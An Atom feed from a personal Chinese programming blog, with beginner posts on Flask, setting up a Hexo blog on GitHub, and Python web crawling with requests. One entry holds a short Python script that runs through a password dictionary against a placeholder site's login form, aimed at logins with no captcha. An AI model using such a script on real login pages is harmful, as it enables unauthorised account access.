<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>shiny-boy</title>
  <subtitle>阳光男孩</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://aiwanxia.github.io/"/>
  <updated>2017-03-07T05:43:04.471Z</updated>
  <id>https://aiwanxia.github.io/</id>
  
  <author>
    <name>satan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>初识flask（一）</title>
    <link href="https://aiwanxia.github.io/2017/03/07/flask%E5%85%A5%E9%97%A8(1)/"/>
    <id>https://aiwanxia.github.io/2017/03/07/flask入门(1)/</id>
    <published>2017-03-07T02:31:21.000Z</published>
    <updated>2017-03-07T05:43:04.471Z</updated>
    
    <content type="html"><![CDATA[<p>首先在学习flask之前，我们来了解一下什么是flask，在百度百科上我们知道：</p>
<ul>
<li>1</li>
</ul>
<p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。<br>Flask使用 BSD 授权。</p>
<ol>
<li><p>Flask也被称为 “microframework” ，因为它使用简单的核心，用 extension 增加其他功能。Flask没有默认使用的数据库、窗体验证工具。然而，Flask保留了扩增的弹性，可以用Flask-extension加入这些功能：ORM、窗体验证工具、文件上传、各种开放式身份验证技术。最新版本为0.11<br>Flask简单易学，下面是Flask版的hello world(hello.py):</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">from flask import Flask</div><div class="line"></div><div class="line">app = Flask(__name__)</div><div class="line">@app.route(&quot;/&quot;)</div><div class="line">def hello():    </div><div class="line">    return &quot;Hello World!&quot;</div><div class="line"> </div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    app.run()</div><div class="line">安装flask即可运行了：</div><div class="line">$ pip install Flask</div><div class="line"> </div><div class="line">$ python</div><div class="line">hello.py* Running on http://localhost:5000/</div><div class="line"> </div><div class="line">*flask默认端口是5000</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先在学习flask之前，我们来了解一下什么是flask，在百度百科上我们知道：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Ji
    
    </summary>
    
    
      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>利用hexo与nodejs搭建博客</title>
    <link href="https://aiwanxia.github.io/2017/03/05/%E5%88%A9%E7%94%A8hexo%E4%B8%8Enodejs%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://aiwanxia.github.io/2017/03/05/利用hexo与nodejs搭建博客/</id>
    <published>2017-03-05T03:31:21.000Z</published>
    <updated>2017-03-06T13:26:12.600Z</updated>
    
    <content type="html"><![CDATA[<p>我一直都想要拥有一个属于自己的博客，写下自己的无聊，偶然的机会，我在网上看到了一篇文章，教你如何用20min搭建一个属于自己的博客，看到这，我心动了，并且开始按照他的指示操作起来，就这样20多min后，我也拥有了属于自己的博客，成就感十足，现在，让我来带大家搭建一个属于自己的博客！</p>
<ol>
<li><p><strong>这个是我一边写这篇教程一边搭建的。所以如果你也和我一样，喜欢自由，喜欢捣腾，那就来吧。</strong></p>
</li>
<li><p><strong>系统：windows 7 64位，编辑器：sublime text3，控制台：cmder</strong></p>
</li>
<li><p><strong>搭建博客使用hexo+Github</strong></p>
</li>
</ol>
<p><img src="https://pic2.zhimg.com/v2-d67939b68c7a3f2515e3a9c26744f5b1_b.jpg" alt="简易的博客框架"></p>
<h2 id="什么是hexo文档"><a href="#什么是hexo文档" class="headerlink" title="什么是hexo文档"></a><strong>什么是hexo<a href="https://link.zhihu.com/?target=https://hexo.io/zh-cn/docs/" target="_blank" rel="external">文档</a></strong></h2><ol>
<li>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="https://link.zhihu.com/?target=http://daringfireball.net/projects/markdown/" target="_blank" rel="external">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</li>
</ol>
<p>#一. 配置github<br>首先注册、登录 <a href="https://github.com/" target="_blank" rel="external">https://github.com/</a></p>
<p>记住自己的Username（很重要）</p>
<p>然后右上角选择 Create a new repository  <a href="https://github.com/new" target="_blank" rel="external">https://github.com/new</a></p>
<p>Repository name 填自己的名字  <a href="http://yourname.github.io(yourname与你的注册用户名一致,这个就是你博客的域名了" target="_blank" rel="external">http://yourname.github.io(yourname与你的注册用户名一致,这个就是你博客的域名了</a>)</p>
<p>例如，我的域名是<a href="http://github.com/aiwanxia，就填入http://aiwanxia.github.io。成功后出现下面的画面![github注册成功图][4" target="_blank" rel="external">http://github.com/aiwanxia，就填入http://aiwanxia.github.io。成功后出现下面的画面![github注册成功图][4</a>]</p>
<p>#二.环境安装</p>
<ol>
<li>安装 Node.js<a href="https://link.zhihu.com/?target=https://nodejs.org/en/" target="_blank" rel="external">Node.js</a></li>
</ol>
<ol>
<li>安装 Git<a href="https://github.com/waylau/git-for-win" target="_blank" rel="external">git下载地址</a>（<a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/" target="_blank" rel="external">git</a>教程这里有廖雪峰老师的教程，非常好）</li>
<li>安装完成后，在开始菜单里找到“Git”-&gt;“Git Bash”，名称和邮箱是Github上的<img src="https://pic2.zhimg.com/v2-3d2da2b383ea2e014f9c669998e65d55_b.jpg" alt="输入自己username和Email"></li>
<li><strong>安装 Hexo</strong>。所有必备的应用程序安装完成后，即可使用 <strong>npm</strong> 安装 <strong>Hexo</strong>。<br><code>$ npm install -g hexo-cli</code><br>成功之后如图显示<img src="https://pic4.zhimg.com/v2-aec3ab5c2ba1fd9299bab1b8fbfdc6bb_b.jpg" alt="cmder"><br>（使用的<a href="http://cmder.net/" target="_blank" rel="external">cmder</a>，一款可以在windows系统下使用Linux命令的工具）</li>
</ol>
<p>好了到这一步我们环境全部安装好了</p>
<p>#三.创建自己的blog目录<br>在电脑任意目录下新建文件夹 blog，进入blog，按住Shift键点击鼠标右键,选择 “git bash here”<br>输入<code>hexo init blog</code>（初始化hexo）<br>速度有点慢,成功提示为</p>
<pre><code>INFO  Start blogging with Hexo!
</code></pre><p>因为你初始化hexo 之后source目录下自带一篇hello world文章, 所以直接执行下方命令<br><code>$ hexo generate</code><br><strong>启动本地服务器</strong></p>
<p> <code>$ hexo server</code></p>
<p>在浏览器输入 <a href="http://localhost:4000/就可以看见网页和模板了" target="_blank" rel="external">http://localhost:4000/就可以看见网页和模板了</a><br>INFO  Start processing<br>INFO  Hexo is running at <a href="http://localhost:4000/" target="_blank" rel="external">http://localhost:4000/</a>. Press Ctrl+C to stop.<br><img src="https://pic4.zhimg.com/v2-8dc21d8652e725fe700aa085e061d057_b.jpg" alt="本地博客"><br>重新打开git，输入：<br> <code>ssh-keygen -t rsa -C &quot;Github的注册邮箱地址&quot;</code><br> 一路Enter过来就好，得到信息：<br> <code>Your public key has been saved in /c/Users/user/.ssh/id_rsa.pub</code><br> 找到该文件，打开（sublime text），Ctrl + a复制里面的所有内容，然后进入<a href="https://github.com/settings/keys" target="_blank" rel="external">Sign in to GitHub</a>:</p>
<pre><code>New SSH key ——Title：blog —— Key：输入刚才复制的—— Add SSH key
</code></pre><p>#四、配置博客<br>在blog\blog目录下，用sublime打开_config.yml文件，修改参数信息</p>
<pre><code># Hexo Configuration
## Docs: http://hexo.io/docs/configuration.html
## Source: https://github.com/hexojs/hexo/
# Site #站点信息
title:  #标题
subtitle:  #副标题
description:  #站点描述，给搜索引擎看的
author:  #作者
email:  #电子邮箱
language: zh-CN #语言
# URL #链接格式
url:  #网址
root: / #根目录
permalink: :year/:month/:day/:title/ #文章的链接格式
tag_dir: tags #标签目录
archive_dir: archives #存档目录
category_dir: categories #分类目录
code_dir: downloads/code
permalink_defaults:
# Directory #目录
source_dir: source #源文件目录
public_dir: public #生成的网页文件目录
# Writing #写作
new_post_name: :title.md #新文章标题
default_layout: post #默认的模板，包括 post、page、photo、draft（文章、页面、照片、草稿）
titlecase: false #标题转换成大写
external_link: true #在新选项卡中打开连接
filename_case: 0
render_drafts: false
post_asset_folder: false
relative_link: false
highlight: #语法高亮
  enable: true #是否启用
  line_number: true #显示行号
  tab_replace:
# Category &amp; Tag #分类和标签
default_category: uncategorized #默认分类
category_map:
tag_map:
# Archives
2: 开启分页
1: 禁用分页
0: 全部禁用
archive: 2
category: 2
tag: 2
# Server #本地服务器
port: 4000 #端口号
server_ip: localhost #IP 地址
logger: false
logger_format: dev
# Date / Time format #日期时间格式
date_format: YYYY-MM-DD #参考http://momentjs.com/docs/#/displaying/format/
time_format: H:mm:ss
# Pagination #分页
per_page: 10 #每页文章数，设置成 0 禁用分页
pagination_dir: page
# Disqus #Disqus评论，替换为多说
disqus_shortname:
# Extensions #拓展插件
theme: landscape-plus #主题
exclude_generator:
plugins: #插件，例如生成 RSS 和站点地图的
- hexo-generator-feed
- hexo-generator-sitemap
# Deployment #部署，将 lmintlcx 改成用户名
deploy:
  type: git
  repo: 刚刚github创库地址.git
  branch: master
</code></pre><p><strong>特别提醒，在每个参数的：后都要加一个空格</strong></p>
<p><em>其中我们需要修改的信息为：</em></p>
<pre><code>title: （你自己想）
subtitle: 副标题
description: 网页描述
author: （你自己的笔名或其他的，随便填）
language: zh-CN
timezone: Asia/Shanghai
</code></pre><p><em>配置部署（修改成自己的）</em><br>最后那里<br>deploy:<br>  type: git<br>  repo: 用ssh那个 例：git@github.com:aiwanxia/aiwanxia.github.io.git<br>  branch: master</p>
<p>#五.发表文章</p>
<ol>
<li><p><strong>在git中输入</strong></p>
<p> $ hexo new “崔斯特测试文章”<br>会出现 INFO  Created: F:\test\blog\source_posts\崔斯特测试文章.md</p>
<p>找到该文章，打开，使用Markdown语法，该语法介绍可以查看<a href="https://zhangslob.github.io/2017/02/26/%E5%88%A9%E7%94%A8HEXO%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8D%9A%E5%AE%A2/" target="_blank" rel="external">利用HEXO搭建的博客</a>及Markdown语法介绍</p>
<pre><code>---
title: 崔斯特测试文章
date: 2017-02-28 13:03:44
tags:
---
</code></pre><p>保存，然后执行下列步骤：<br>\blog\blog<br>$ hexo clean<br>INFO  Deleted database.<br>INFO  Deleted public folder.</p>
</li>
</ol>
<pre><code> \blog\blog
    $ hexo generate
    INFO  Start processing
    INFO  Files loaded in 1.48 s
    #省略
    INFO  29 files generated in 4.27 s

\blog\blog
$ hexo server
INFO  Start processing
INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.

这个时候，打开http://localhost:4000/，发现刚才的文章已经成功了

最后一步，发布到网上，执行：
</code></pre><p>  \blog\blog<br>     <code>$ hexo deploy</code><br>    INFO  Deploying: git<br>    INFO  Clearing .deploy_git folder…<br>    INFO  Copying files from public folder…</p>
<pre><code>#省略

如果发现deploy没有的话，请使用命令
 `npm install hexo-deployer-git --save `
</code></pre><p>#六、总结<br>发布文章的步骤：</p>
<p>1、hexo new 创建文章</p>
<p>2、Markdown语法编辑文章</p>
<p>3、部署（所有打开CMD都是在blog目录下）</p>
<p><code>hexo clean #清除缓存 网页正常情况下可以忽略此条命令</code><br><code>hexo generate #生成</code><br><code>hexo server #启动服务预览，非必要，可本地浏览网页</code><br><code>hexo deploy #部署发布</code></p>
<p>也可以简写为：<br><code>hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章</code><br><code>hexo p == hexo publish</code><br><code>hexo g == hexo generate#生成</code><br><code>hexo s == hexo server #启动服务预览</code><br><code>hexo d == hexo deploy#部署</code></p>
<p>如果在执行 hexo deploy 后,出现 error deployer not found:github 的错误，执行：<br><code>npm install hexo-deployer-git --save</code></p>
<p>到这里已经完成了博客的搭建，但是还有很多需要设置和调整的。这是我的博客，也许你会发现，我和刚才搭建的不一样，因为我修改了博客主题，简洁、优美。<a href="https://aiwanxia.github.io/index.html">博客样式</a></p>
<p>#七.主题安装<br>主题安装</p>
<p>hexo的主题列表Hexo Themes。<br><strong>个人推荐的主题</strong><br><a href="https://github.com/forsigner/fexo" target="_blank" rel="external">fexo</a> ——这是一个极简的主题，喜欢简洁的可以看看。<br><a href="https://github.com/stiekel/hexo-theme-random/blob/master/README.CN.md" target="_blank" rel="external">random</a>——这个是我现在正在使用的主题，自定义的轮播图看起来很好。<br><a href="https://github.com/SuperKieran/TKL" target="_blank" rel="external">TKL</a>——这个主题是我那个报废的博客用的，一个优雅的响应式主题。<br><a href="https://github.com/SuperKieran/TKL" target="_blank" rel="external">yilia</a>——优雅简洁响应式主题。<br>下面的安装以random为例<br>在你的博客根目录里，执行如下的命令：</p>
<p><code>git clone https://github.com/stiekel/hexo-theme-random.git themes/random</code><br>然后修改博客的主配置文件，将主题设置为random</p>
<p>升级</p>
<p><code>cd themes/random</code><br><code>git pull</code><br>成功<br>最后在使用命令上传，ok!<br><code>hexo g -d</code><br>打开 username(你的注册名字).github.io,则可看到自己的博客！例如：<code>aiwanxia.github.io</code></p>
<p>==========================分割线===============================</p>
<p>2017年3月6日更新：主题推荐</p>
<p>NexT主题 开始使用<a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="external">- NexT 使用文档</a> </p>
<p>点击查看<a href="https://aiwanxia.github.io/2017/03/05/%E5%88%A9%E7%94%A8hexo%E4%B8%8Enodejs%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/">教你免费搭建个人博客，Hexo&amp;Github</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我一直都想要拥有一个属于自己的博客，写下自己的无聊，偶然的机会，我在网上看到了一篇文章，教你如何用20min搭建一个属于自己的博客，看到这，我心动了，并且开始按照他的指示操作起来，就这样20多min后，我也拥有了属于自己的博客，成就感十足，现在，让我来带大家搭建一个属于自己
    
    </summary>
    
    
      <category term="hexo" scheme="https://aiwanxia.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>初识hexo命令</title>
    <link href="https://aiwanxia.github.io/2017/03/05/%E5%88%9D%E8%AF%86hexo%E5%91%BD%E4%BB%A4/"/>
    <id>https://aiwanxia.github.io/2017/03/05/初识hexo命令/</id>
    <published>2017-03-05T03:31:21.000Z</published>
    <updated>2017-03-06T13:26:07.138Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
    
    </summary>
    
    
      <category term="hexo" scheme="https://aiwanxia.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>利用python进行暴力破解密码</title>
    <link href="https://aiwanxia.github.io/2017/03/05/%E5%88%A9%E7%94%A8python%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/"/>
    <id>https://aiwanxia.github.io/2017/03/05/利用python进行暴力破解密码/</id>
    <published>2017-03-05T03:31:21.000Z</published>
    <updated>2017-03-06T13:26:23.543Z</updated>
    
    <content type="html"><![CDATA[<p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#encoding=utf-8</div><div class="line">import httplib,urllib</div><div class="line">conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)</div><div class="line">f=open(&quot;dict.txt&quot;) </div><div class="line">while 1:</div><div class="line">    pwd=f.readline().strip()</div><div class="line">    if not pwd:</div><div class="line">        print &apos;字典已比对完。&apos; </div><div class="line">        break </div><div class="line">    params = urllib.urlencode(&#123;&apos;username&apos;: &apos;xxx&apos;, &apos;mod&apos;: &apos;&apos;, &apos;password&apos;: pwd&#125;) </div><div class="line">    headers = &#123;&quot;Content-type&quot;:  &quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;&#125; </div><div class="line">    conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers) </div><div class="line">    r = conn.getresponse() </div><div class="line">    print r.status, r.reason </div><div class="line">    data1 = r.read().decode(&apos;gbk&apos;)#编码根据实际情况酌情处理  </div><div class="line">    print data1.index(u&apos;您输入的密码有误&apos;),&apos;您输入的密码\&apos;%s\&apos;有误&apos;%pwd </div><div class="line">  conn.close()</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;根据字典文件,使用python进行暴力破解,程序很简单&lt;br&gt;注：针对没有验证码的情况&lt;br&gt;实例代码&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;lin
    
    </summary>
    
    
      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>never give up</title>
    <link href="https://aiwanxia.github.io/2017/03/05/never-give-up/"/>
    <id>https://aiwanxia.github.io/2017/03/05/never-give-up/</id>
    <published>2017-03-05T02:58:52.000Z</published>
    <updated>2017-03-06T13:25:36.021Z</updated>
    
    <content type="html"><![CDATA[<p>hello,welcome to my personal blog!<br>搭建博客的时候遇见了很多坑，因为网上的教程大多都是hexo 2.X的，现在使用命令<code>npm install -g hexo-cli</code>安装的是最新版本，所以会常常出错，但是，never give up,只要你愿意找，你始终会找到答案的，相信自己可以的，不要放弃，下面我给大家讲讲搭建博客时的一些坑，及如何解决！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hello,welcome to my personal blog!&lt;br&gt;搭建博客的时候遇见了很多坑，因为网上的教程大多都是hexo 2.X的，现在使用命令&lt;code&gt;npm install -g hexo-cli&lt;/code&gt;安装的是最新版本，所以会常常出错，但是，ne
    
    </summary>
    
    
      <category term="前言" scheme="https://aiwanxia.github.io/tags/%E5%89%8D%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>初识python爬虫</title>
    <link href="https://aiwanxia.github.io/2017/03/05/python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8(%E4%B8%80)/"/>
    <id>https://aiwanxia.github.io/2017/03/05/python爬虫入门(一)/</id>
    <published>2017-03-05T02:58:52.000Z</published>
    <updated>2017-03-06T13:01:41.890Z</updated>
    
    <content type="html"><![CDATA[<p>#一.什么是爬虫<br>    <a href="http://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB" target="_blank" rel="external">网络爬虫</a>（又被称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动地抓取万维网信息的程序或者脚本。另外一些不常使用的名字还有蚂蚁、自动索引、模拟程序或者蠕虫。</p>
<p>打开一个网页，里面有网页内容吧，想象一下，有个工具，可以把网页上的内容获取下来，存到你想要的地方，这个工具就是我们今天的主角：爬虫。</p>
<p>这样是不是更清晰了呢？</p>
<p>既然了解了爬虫是什么，那么爬虫是如何爬取数据的呢？</p>
<p>#二.爬虫是哪里爬取数据的<br>    鼠标在页面上点击右键，然后点击view page source。看到这些文字了吗？这才是网页最赤果果的样子。<a href="http://upload-images.jianshu.io/upload_images/3879861-32b85a59ff142691.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=6226699" target="_blank" rel="external">网页</a></p>
<pre><code>其实所有的网页都是HTML代码，只不过浏览器将这些代码解析成了上面的网页，我们的小爬虫抓取的其实就是HTML代码中的文本啦。
</code></pre><p>这不合理啊，难不成那些图片也是文本？</p>
<p>恭喜你，答对了。回到浏览器中有图的哪个tab页，鼠标右键，点击Inspect。会弹出一个面板，点击板左上角的箭头，点击虐狗图片，你会看到下面有红圈圈的地方，是图片的网络地址。图片可以通过该地址保存到本地哦。<br>    你猜的没错，我们的小爬虫抓取的正是网页中的数据，你要知道你想要抓取什么数据，你的目标网站是什么，才可以把想法变成现实的哦。你不能说，我想要这个这个，还有这个，然后数据就自动来了。</p>
<p>#四、学习爬虫的必备知识</p>
<p> 1.HTML<br>这个能够帮助你了解网页的结构，内容等。可以参考W3School的教程。</p>
<p>2.Python<br>如果有编程基础的小伙伴儿，推荐看一个廖雪峰的Python教程就够了<br>没有编程基础的小伙伴，推荐看看视频教程（网易云课堂搜Python），然后再结合廖雪峰的教程，双管齐下。<br>其实知乎上总结的已经非常好了，我就不多唠叨了。知乎-如何系统的自学Python</p>
<p>3.TCP/IP协议，HTTP协议<br>这些知识能够让你了解在网络请求和网络传输上的基本原理，了解就行，能够帮助今后写爬虫的时候理解爬虫的逻辑。<br>廖雪峰Python教程里也有简单介绍，可以参考：TCP/IP简介，HTTP协议<br>想更深入学习的小伙伴儿可以去网上多搜搜相关的书籍哦</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#一.什么是爬虫&lt;br&gt;    &lt;a href=&quot;http://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;网络爬虫&lt;/a&gt;（又被称为网页
    
    </summary>
    
    
      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python爬虫环境准备</title>
    <link href="https://aiwanxia.github.io/2017/03/05/python%E7%88%AC%E8%99%AB%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"/>
    <id>https://aiwanxia.github.io/2017/03/05/python爬虫环境准备/</id>
    <published>2017-03-05T02:58:52.000Z</published>
    <updated>2017-03-06T14:29:34.712Z</updated>
    
    <content type="html"><![CDATA[<p>#1.安装Python</p>
<pre><code>安装完了记得配置环境，将python目录和python目录下的Scripts目录添加到系统环境变量的Path里。在cmd中输入python如果出现版本信息说明配置完毕（如下面截图）。[python][1]![][2]
</code></pre><hr>
<p>#Python爬虫小白入门（二）requests库</p>
<hr>
<p><strong>一、运行环境</strong><br>    1.Windows10<br>    可以是linux,mac,安装找百度。<br>    2.Python2.7<br>    推荐使用Anaconda这个科学计算版本，主要是因为它自带一个包管理工具，可以解决有些包安装错误的问题。去<a href="https://www.continuum.io/downloads" target="_blank" rel="external">Anaconda</a>官网，选择Python2.7版本，然后下载安装。<br>    3.IDE<br>    我使用的是PyCharm，是专门为Python开发的IDE。这是JetBrians的产品，<a href="http://www.jetbrains.com/pycharm/" target="_blank" rel="external">点我下载</a>。</p>
<hr>
<p>#二、requests 库的安装<br>使用Anaconda 版本的得小伙伴儿：用管理员权限运行cmd命令窗口，然后输入</p>
<pre><code>conda install requests
</code></pre><p>看动图：<img src="http://upload-images.jianshu.io/upload_images/3879861-0a6ce29c80c5e143.gif?imageMogr2/auto-orient/strip&amp;_=6230337" alt="此处输入图片的描述"><br>直接使用Python2.7的小伙伴儿输入这个命令：</p>
<pre><code>pip install requests

requests库安装完毕，接下来我们会在实际例子中演示它的使用。想要深入了解requests模块的小伙伴也可以仔细阅读[英文官方文档][6]，和[中文官方文档][7]，如果用到该文没有提到的功能，则查看文档即可。
</code></pre><hr>
<p>#三、开工<br>首先我们打开PyCharm，需要选择一下它的页面主题。选择你喜欢的风格，以及选择使用的Python版本。然后打开一个你想要存放爬虫的目录，进入后长这样。<img src="http://upload-images.jianshu.io/upload_images/3879861-3741f3912aee5d9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=6230337" alt="此处输入图片的描述"><br>我们再创建一个python文件，输入第一行代码来导入requests库：</p>
<pre><code>import requests #导入requests库
</code></pre><p>然后用它来获取咱们的目标网页：</p>
<p><code>r = requests.get(&#39;https://unsplash.com&#39;)</code> <code>#像目标url地址发送get请求，返回一个response对象</code></p>
<pre><code>print(r.text) #r.text是http response的网页HTML
</code></pre><p>在菜单栏点击“Run”，选择该文件（或者直接在窗口中点击右键，运行该文件）：<br><img src="http://upload-images.jianshu.io/upload_images/3879861-fb8084241e041148.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=6230337" alt="此处输入图片的描述"><br>执行完之后，底部会出现输出结果：<br><img src="http://upload-images.jianshu.io/upload_images/3879861-3852bc7e0aa06509.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=6230337" alt="此处输入图片的描述"><br>可以看到底部是获取到的网页内容。这就完成了爬虫的第一步，获取到了网页的HTML内容。<br>怎么样，很简单吧。</p>
<p>这只是用到了requests库的get请求，还有其他的请求使用也与之类似。下面我们简单介绍一下每个请求的用法。</p>
<hr>
<p>#四、requests库的使用<br>因为有中文的官方文档，我就不介绍所有的功能了，只把常用到的说一下，大家用到更多功能的时候再去翻官方文档吧。</p>
<p>requests 库就是用来发送各种请求的，所以，我们就来看看各种请求怎么使用：</p>
<p><strong>4.1 get 请求</strong></p>
<pre><code>r = requests.get(&quot;https://unsplash.com&quot;)
</code></pre><p>这就是我们刚刚用到的。其实就是向网站发送了一个get请求，然后网站会返回一个response。r 就是response。大家可以在运行的时候查看r的type。</p>
<pre><code>print(type(r))![此处输入图片的描述][11]
get请求还可以传递参数：

payload = {&apos;key1&apos;: &apos;value1&apos;, &apos;key2&apos;: &apos;value2&apos;}

r = requests.get(&quot;http://httpbin.org/get&quot;, params=payload)
上面代码向服务器发送的请求中包含了两个参数key1和key2，以及两个    参数的值。实际上它构造成了如下网址：
</code></pre><p><a href="http://httpbin.org/get?key1=value1&amp;key2=value2" target="_blank" rel="external">http://httpbin.org/get?key1=value1&amp;key2=value2</a></p>
<p><strong>4.2 POST请求</strong></p>
<p>无参数的post请求：</p>
<pre><code>r = requests.post(&quot;http://httpbin.org/post&quot;)
</code></pre><p>有参数的post请求：</p>
<pre><code>payload = {&apos;key1&apos;: &apos;value1&apos;, &apos;key2&apos;: &apos;value2&apos;}

r = requests.post(&quot;http://httpbin.org/post&quot;, data=payload)
</code></pre><p>post请求多用来提交表单数据，即填写一堆输入框，然后提交。</p>
<p><strong>4.3 其他请求</strong></p>
<p>其他一些请求例如put请求、delete请求、head请求、option请求等其实都是类似的。但是平时用的不多，就不仔细介绍了。有用到的可以去看官网文档哦。阅读官方文档是必备技能！</p>
<pre><code>r = requests.put(&quot;http://httpbin.org/put&quot;)
r = requests.delete(&quot;http://httpbin.org/delete&quot;)
r = requests.head(&quot;http://httpbin.org/get&quot;)
r = requests.options(&quot;http://httpbin.org/get&quot;)
</code></pre><hr>
<p>五、后语<br>我们刚才用requests库发送http请求获得了网页的HTML内容，那么应该如何从HTML中获得图片呢？</p>
<p>BeautifulSoup库就此登场啦，赶快去看一下篇来了解它的用法吧。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#1.安装Python&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;安装完了记得配置环境，将python目录和python目录下的Scripts目录添加到系统环境变量的Path里。在cmd中输入python如果出现版本信息说明配置完毕（如下面截图）。[python][1]![][2]
&lt;
    
    </summary>
    
    
